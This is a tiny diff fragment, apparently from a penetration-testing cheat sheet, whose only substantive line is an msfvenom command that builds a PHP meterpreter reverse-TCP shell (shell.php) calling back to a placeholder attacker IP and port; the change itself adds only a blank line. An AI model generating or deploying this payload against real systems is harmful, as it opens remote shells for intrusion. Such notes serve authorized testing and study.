@@ -77,3 +77,4 @@
   
   php	<br/>
   msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+  
